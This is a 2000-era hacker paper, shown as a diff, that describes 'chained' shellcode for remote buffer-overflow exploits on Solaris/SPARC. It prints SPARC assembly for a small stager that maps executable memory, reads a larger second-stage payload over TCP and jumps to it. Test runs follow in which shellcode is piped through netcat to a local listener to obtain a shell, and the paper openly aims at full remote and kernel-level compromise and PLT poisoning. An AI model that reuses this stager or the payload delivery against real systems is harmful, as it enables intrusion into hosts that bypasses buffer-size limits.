@@ -1,0 +1,338 @@
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+[------ Chained Payload Attacks --------------------------------------------]
+[------ by User Datagram Protocol ------------------------------------------]
+[------ Sunday December 17th 2000 -------------------------- First Draft ---]
+
+-------------[ Table of Contents ]-------------------------------------------
+
+                         -------------------------
+-0x00                   [ IPR / BSD License       ]
+-0x01                   [ Executive Summary       ]
+-0x02                   [ Introduction            ]
+-0x03                   [ Rationale               ]
+-0x05                   [ Tools                   ]
+-0x06                   [ Code                    ]
+-0x07                   [ Conclusions             ]
+-0x08                   [ References              ]
+-0x0A                   [ Contact Info            ]
+                         -------------------------
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+-0x00-------------------[ IPR / BSD License       ]
+
+    This document and its contents are comprised of my own research, and are
+    (c) Copyright 2000 Bruce M. Simpson, All Rights Reserved Worldwide.
+
+    Redistribution and use in ASCII text format and other formats, with or
+    without modification, are permitted provided that the following conditions
+    are met:
+
+    1. Redistributions of this document must retain the above copyright
+    notice, this list of conditions and the following disclaimer.
+
+    2. Redistributions in any other format must reproduce the above copyright
+    notice, this list of conditions and the following disclaimer in the
+    documentation and/or other materials provided with the distribution.
+
+    3. All advertising materials mentioning features or use of this document
+    must display the following acknowledgement: This work is based in part of
+    the work of Bruce M. Simpson.
+
+    4. The name of Bruce M. Simpson may NOT be used to endorse or promote
+    works derived from this work without specific prior written permission.
+
+    No warranty or representation is made regarding the reliability,
+    suitability, or correctness of the information within this document. Use
+    of any code or information within this document is completely at your own
+    risk; Bruce M. Simpson will not be held liable for any form of
+    compensation for financial loss caused directly or indirectly by the use
+    of information within this document.
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+-0x01-------------------[ Executive Summary       ]
+
+Remote buffer overflows are a class of software vulnerability which makes it
+possible to subvert an application without requiring user credentials for
+a system.
+
+These vulnerabilities have grievous consequences for network security. This
+paper discusses a new kind of attack payload which can be used to smuggle
+more code into the victim system.
+
+Impact:
+The attacker could potentially subvert the entire OS kernel in one fell swoop.
+
+Amusement:
+If you've ever used the BBC Micro's 'CHAIN' tape loader command, you'll get
+this one right away.
+
+-0x02-------------------[ Introduction            ]
+
+Assuming that a networked application is vulnerable to a remote buffer
+overflow, running on a Solaris platform, with a small buffer size, it may
+be possible to remotely inject code which is far more hostile than would
+normally be the case, given the size of the buffer.
+
+Buffer size tends to be more of a limitation for SPARC and other RISC
+architectures. SPARC instruction streams must be aligned to 4-byte boundaries
+within address space. Chained payloads mean that the disadvantage to the
+attacker posed by a small buffer size has been lifted.
+
+Assuming that the application is running on a firewalled host, and that
+there isn't /too/ much stateful filtering and/or application layer form
+checking of requests, the consequences could be extremely dire.
+
+The 'bootstrap' shellcode employed within this paper has been named 'Booty'.
+
+-0x03-------------------[ Rationale               ]
+
+This project is intended to be contributory. I'm building up to a climax here-
+complete remote compromise of a Solaris host, at the *operating system*
+and perhaps even the *microcode* level, in one decisive action.
+
+Note that the same technique can be applied in the case of local
+vulnerabilities. The attacker, once provided with his/her own address space,
+and a means of executing that code, can begin to load and position code
+which perhaps requires relocations.
+
+One of the limitations of shell code is that it must have no relocations,
+and for maximum effectiveness, it should be reentrant and position independent.
+
+The technique documented within this paper augments stack-based overflow
+techniques as well as heap-based and format-based overflow methodologies.
+I have not directly observed this technique being used in the field.
+
+Now that the size limitation on remote shellcode has been lifted, 
+the possibilities are endless.
+
+-0x04-------------------[ Tools                   ]
+
+A few tools were prepared for the feast:
+
+shxdump -- Dump code in '\xFF' format for inclusion.
+dump_shellcode.sh -- Wrapper script which invokes shxdump.
+
+These can be used to format the assembled shellcode ready for exploit
+presentation.
+
+-0x05-------------------[ Code                    ]
+
+The technique is reasonably simple. Assuming the attacker smashes the stack,
+or is able to inject and execute a small amount of arbitrary code, and that
+the process runs with regular user credentials (can allocate memory, can
+read files, can create a socket etc) then further code may be injected to
+form the action the attacker really intended.
+
+Booty is available in local, remote passive, and remote active flavors. Pick
+the shellcode delivery platform of your choice. Fire it up. Poison PLTs.
+
+This code will be released soon - the most important bits:
+
+Open of /dev/zero under Solaris (points to the mm driver module, which
+actually implements kmem, mem, zero and null):
+
+shellcode:
+	...
+        sethi   %hi(devzero_tuple_2),%l0
+        or      %l0,%lo(devzero_tuple_2),%l0
+        st      %l0,[%o0 + 8]
+        mov     O_RDWR,%o1
+        mov     _open,%g1
+        ta      8
+        st      %o0,[%fp + l_p_fd]
+        mov     %o0,%l3                 ! l3 = dev zero fd
+
+Anonymous mmap of /dev/zero to get some VM allocated for you:
+
+        sub     %o0,%o0,%o0
+        sethi   %hi(sizeof_pblock),%o1
+        or      %o1,%lo(sizeof_pblock),%o1
+        mov     PROT_ALL,%o2
+        sethi   %hi(_MAP_NEW),%o3       ! need MAP_NEW
+        or      %o3,MAP_PRIVATE,%o3
+        mov     %l3,%o4
+        clr     %o5
+        mov     _mmap,%g1       
+        ta      8
+        nop
+        mov     %o0,%l4                 ! l4 -> memory
+        st      %o0,[%fp + l_p]
+
+And finally, reading the code into your buffer using your preferred shellcode
+delivery method, in this case, a passive TCP open:
+
+loopy:
+        ld      [%fp + l_p],%l1         ! l1 -> cur
+        sethi   %hi(sizeof_pblock),%l3
+        mov     %l1,%l2
+        add     %l3,%l2,%l2             ! l2 -> end
+feh:
+        mov     %l0,%o0
+        mov     %l1,%o1                 
+        mov     2048,%o2                ! 2k blocks.
+        mov     _read,%g1               ! Pump it in deep and slowly.
+        ta      8
+        add     %l1,2048,%l1
+        cmp     %l1,%l2
+        blu,a   feh
+        sub     %o0,%o0,%o0
+fah:
+        ld      [%fp + l_p],%o0         ! l1 -> start
+        ld      [%fp + l_oldsp],%o1     ! and o1 -> sp as it was
+        call    %l4                     ! b00m!
+        add     %o1,%o1,%o1             ! fill slot, leave stack dirty
+
+Boom! Can you guess what I'm going to inject into Solaris in the next paper?
+
+--------------------[ Testing the shellcode
+
+Compile and fire up the bind()/listen() version of Booty:
+
+ % ./booty
+[ shellcode entered at _start, blocking in accept()] 
+
+Switch to another shell. Verify that the memory has been allocated via
+the anonymous mapping mechanism:
+ % ps -aef | fgrep booty
+udp 19745 11261  0 09:27:27 pts/8    0:00 fgrep booty
+udp 19739  1258  0 09:25:10 pts/21   0:00 ./booty
+ [ pid 19739 ]
+
+Inspect the process's memory maps via the /proc filesystem and its tools:
+ % /usr/proc/bin/pmap 19739
+19739:  ./booty
+00010000      4K read/exec         dev:32,29 ino:348008
+EF7D0000    128K read/write/exec     [ anon ]
+EFFFE000      8K read/write          [ stack ]
+ total      140K
+
+Now supply the chaining code with 128K of other data, using netcat:
+ % dd if=/dev/random bs=1024 count=128 | nc -w 1 -v -v 0 31338
+0: inverse host lookup failed: Unknown host
+(UNKNOWN) [0.0.0.0] 31338 (?) open
+128+0 records in
+128+0 records out
+net timeout
+ sent 131072, rcvd 0
+
+Switch to your other shell with Booty running under it:
+Illegal instruction
+Exit 132
+
+Now inspect the core file:
+ % adb
+core file = core -- program ``bootyc'' on platform SUNW,SPARCstation-20
+SIGILL: Illegal Instruction
+$c
+?() at ef7d0000
+data address not found
+
+As you can see, the process has successfully allocated memory, read as much
+data in at that address as it can, and begun executing it.
+
+Experimenting with a piece of tiny shellcode sandwiched on top of some
+random bytes (let's say p1k has your exece() based Solaris shellcode):
+ % set feh=`ls -l p1k | awk '{print $5}'`
+ % set fuh=`echo "131072 - $feh" | bc` 
+ % dd if=/dev/random of=./pUk bs=$fuh count=1
+E voila, instant chained attack payload.
+
+Now get ready:
+ shell1% ./booty
+ shell2% cat p1k pUk | nc -w 1 -v -v 0 31338 
+
+Watch.
+ % cat p1k pUk | nc -v -v 127.0.0.1 31338
+localhost [127.0.0.1] 31338 (?) open
+$ 
+
+You now have a shell invoked by the chained shellcode. This could potentially
+be any piece of code, and now, you're no longer limited by the size of that
+buffer. The scope for abuse is going to be explored further. It is certainly
+possible for a local exploit to read arbitrary files holding object code for
+execution, so if you have a large piece of code to e.g. poison the PLT, that
+would not normally fit into 512 characters, then you can employ chaining to
+deliver the PLT poisoning code.
+
+Further work on this device will explore simulating an ELF exece() purely
+through the use of position independent, nonrelocated code.
+
+-0x06-------------------[ Conclusions             ]
+
+ - Being able to allocate memory from within modern UNIX using the
+   mmap() system call is a real boon. I've used it for building high
+   performance media servers in the past - I never really thought about
+   using it to smash system security before. My how things change!
+ - Countermeasures include domain type enforcement (real mandatory
+   access control), securelevel for Solaris (coming out soon).
+ - This stuff isn't going to fool stochastic analysis based IDS.
+
+-0x07-------------------[ References              ]
+
+------[ Articles ]
+
+P56-07: Shared Library Redirection via ELF PLT Infection
+P56-14: Exploiting Non-Adjacent Memory Spaces, by twitch
+
+------[ Books ]
+
+Advanced Programming in the UNIX Environment
+by W. Richard Stevens
+Addison-Wesley, 1992
+
+80386 Assembly Language: A Complete Tutorial and Subroutine Library
+by Penn Brumm & Don Brumm
+McGraw-Hill
+ISBN 0-07-155992-2
+
+------[ Web ]
+
+Hardening the Solaris Kernel, by udp
+http://www.low-level.net/udp/papers/hardening-solaris.txt
+
+Domain and Type Enforcement, SAIC
+http://research-cistw.saic.com/cace/dte.html
+
+udp's home page
+http://www.low-level.net/udp/
+
+Phrack Magazine
+http://phrack.infonexus.com/
+
+Solaris Loadable Kernel Modules, The Hacker's Choice
+http://thc.inferno.tusculum.edu/files/thc/slkm-1.0.html
+
+Transparent Run-Time Defense Against Stack Smashing Attacks, Bell Labs
+http://www.bell-labs.com/org/11356/docs/usenix00/paper.html
+
+Hardened 4.4BSD Kernel, Tom Ptacek
+http://www.enteract.com/~tqbf/harden.html
+
+-0x08-------------------[ Acknowledgements        ]
+
+Thanks and shout-outs to:
+
+    dalias		for bashing the idea out with me on IRC.
+    silvio              for extensive exploration of subverting ELF.
+    cripto		for kicking my ass into gear.
+    jimjones		for assistance and advice.
+
+"The look in your eye
+ The pressure, you kill with a knife
+ Toxins and games
+ You- you vow to *win*." -- Front Line Assembly, 'Resist'
+
+-0x09-------------------[ Contact Info            ]
+
+Bruce M. Simpson aka 'udp'      <udp@low-level.net>
+
+Canonical URL for this document:
+http://www.low-level.net/udp/papers/chained-shellcode.txt
+
+This paper would not have been possible had it not been for Nong Shim
+noodle cups, and Haujobb turned up to 8 to make my ears bleed.
+
++0xFF+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[ EOF ]
